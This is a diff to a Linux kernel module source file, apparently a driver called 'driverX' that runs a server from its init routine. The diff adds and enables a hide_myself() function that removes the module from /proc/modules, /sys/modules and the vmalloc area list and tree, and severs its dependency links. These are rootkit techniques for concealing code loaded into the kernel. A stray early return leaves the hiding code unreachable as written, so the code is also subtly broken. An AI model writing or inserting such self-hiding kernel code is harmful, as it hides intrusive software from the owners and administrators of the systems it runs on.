@@ -31,10 +31,57 @@
 
 // bool isDevUse = false;
 
+static void __init hide_myself(void)
+{
+    struct vmap_area *va, *vtmp;
+    struct module_use *use, *tmp;
+    struct list_head *_vmap_area_list;
+    struct rb_root *_vmap_area_root;
+
+#ifdef KPROBE_LOOKUP
+    
+    if (register_kprobe(&kp) < 0) {
+	    printk("driverX: module hide failed");
+        return;
+    }
+    kallsyms_lookup_nameX = (unsigned long (*)(const char *name)) kp.addr;
+    unregister_kprobe(&kp);
+#endif
+	
+   return;
+	
+    _vmap_area_list =
+        (struct list_head *) kallsyms_lookup_nameX("vmap_area_list");
+    _vmap_area_root = (struct rb_root *) kallsyms_lookup_nameX("vmap_area_root");
+
+    /* hidden from /proc/vmallocinfo */
+    list_for_each_entry_safe (va, vtmp, _vmap_area_list, list) {
+        if ((unsigned long) THIS_MODULE > va->va_start &&
+            (unsigned long) THIS_MODULE < va->va_end) {
+            list_del(&va->list);
+            /* remove from red-black tree */
+            rb_erase(&va->rb_node, _vmap_area_root);
+        }
+    }
+
+    /* hidden from /proc/modules */
+    list_del_init(&THIS_MODULE->list);
+
+    /* hidden from /sys/modules */
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+
+    /* decouple the dependency */
+    list_for_each_entry_safe (use, tmp, &THIS_MODULE->target_list,
+                              target_list) {
+        list_del(&use->source_list);
+        list_del(&use->target_list);
+        sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
+        kfree(use);
+    }
+}
+
 static int __init pvm_init(void)
 {
-
-
 	int ret;
 
     ret = init_server();
@@ -43,21 +90,8 @@ static int __init pvm_init(void)
         return ret;
 	}
 
-	struct task_struct *task;
-
-    // Pick the first process in the task list (usually init)
-    task = &init_task;
-
-    unsigned long base     = (unsigned long)task;
-    unsigned long off_mm   = (unsigned long)&task->mm   - base;
-    unsigned long off_comm = (unsigned long)&task->comm - base;
-	unsigned long off_pid = (unsigned long)&task->pid - base;
-	
-    // pr_info("init_task: pid=%d comm=%s\n", task_pid_nr(task), task->comm);
-    pr_info("Offsets relative to task_struct: mm=%lu, comm=%lu pid=%lu\n",
-            off_mm, off_comm, off_pid);
     // int ret;
-	// hide_myself();
+	hide_myself();
     // printk("driverX: this: %p", THIS_MODULE); /* TODO: remove this line */
     return 0;
 }
